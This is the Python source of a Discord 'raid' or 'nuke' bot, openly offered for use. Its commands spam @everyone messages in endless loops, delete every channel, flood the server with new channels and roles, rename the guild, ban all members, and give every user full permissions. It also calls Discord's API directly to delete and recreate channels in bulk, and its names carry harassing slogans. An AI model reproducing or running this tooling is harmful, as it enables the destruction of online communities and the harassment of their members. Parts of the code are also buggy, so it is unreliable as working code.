import discord, os, colorama, asyncio, random, json, asyncio, aiohttp
from discord.ext import commands
from discord import Permissions

token = os.environ['token']

kichi = commands.Bot(command_prefix="$", intents = discord.Intents.all())

headers = {"Authorization": f"Bot {token}"}


yoromo = input("Guild ID: ")

  


channel_names = "Heil Tinkgy"


messege_spam = "@everyone Nuked By RmR Stay Safe My fellow Freinds https://media.discordapp.net/attachments/1128776132402094163/1129425411659530300/2023-06-15_1688614963804.mp4"

status = "/help"

@kichi.event
async def on_connect():
  print(f''''
Connected To {kichi.user.name}  
User Id: {kichi.user.id}''')
  await kichi.change_presence(
    activity=discord.Streaming(name=status, url="https://www.twitch.tv/cp"))
     

@kichi.event
async def on_ready():
    print(""""
██╗░░██╗██╗░█████╗░██╗░░██╗██╗
██║░██╔╝██║██╔══██╗██║░░██║██║
█████═╝░██║██║░░╚═╝███████║██║
██╔═██╗░██║██║░░██╗██╔══██║██║
██║░╚██╗██║╚█████╔╝██║░░██║██║
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚═╝

██████╗░░█████╗░██╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝   
___________________________________________________________
|___________________________________________________________|
Welcome To Kichi Raid Bot, this was made by   Tinkgy Do not skid our work

Press Any Button To Continue ☆""")

@kichi.command()
async def spam(ctx):
  while True:
    await ctx.send("@everyone raided by :*RMR*: Surrender") #spams infinite amount of messeges

@kichi.command()
async def purge(ctx):
  for i in range(50):
    await ctx.send("@everyone raided by :*RMR*: Surrender")
  



@kichi.command()
async def channeldelete(ctx):
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
    except:
       pass

@kichi.command()
async def spamchannels(ctx):
  while True:
    await ctx.guild.create_text_channel("joinggragingmonsters") #it spams channels but also raids
    
@kichi.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):

      await ctx.guild.create_role(name=f"Nuked By 𝑹𝑴𝑹 AND NA // Heil Tinkgy Praise")
      





@kichi.command()
async def nuke(ctx):
  guild = ctx.guild
  try:
    await guild.edit(name='Nuked By Tinkgy | Heil RMR and Noah')
  except Exception as e:
    print(f"Failed to edit server name: {str(e)}")
    pass
  tasks = []
  async with aiohttp.ClientSession() as session:
    for channel in ctx.guild.channels:
        tasks.append(asyncio.create_task(session.delete(f'https://discord.com/api/channels/{channel.id}', headers=headers)))
    while True:
        tasks.append(asyncio.create_task(session.post(f'https://discord.com/api/guilds/{ctx.guild.id}/channels', json={'name':channel_names}, headers=headers)))
    await asyncio.gather(*tasks)
                                            
   

@kichi.event
async def on_guild_channel_create(channel):
    while True:
     await channel.send(messege_spam)
  

    

@kichi.command()
async def massban(ctx):
  for member in ctx.guild.members:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
       except:
        pass #bans everyone within 10 seconds or higher


@kichi.command(pass_context=True)
async def perms(ctx):
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                                          await role.edit(permissions=Permissions.all())
                  except:
                    pass #gives all users perms



kichi.run(token)
